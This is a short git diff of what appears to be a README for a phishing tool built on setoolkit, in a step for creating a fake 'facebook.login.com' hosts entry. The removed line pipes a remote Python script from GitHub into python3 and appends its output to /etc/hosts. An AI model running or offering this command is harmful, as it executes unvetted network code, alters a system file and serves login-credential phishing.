@@ -25,7 +25,7 @@ setoolkit
 3. - Creating hosts exploit facebook.login.com
 - For Linux
 ```bash
-curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
+...
 ```
 - continue..
 -----------------------------------------------------------------------------------------
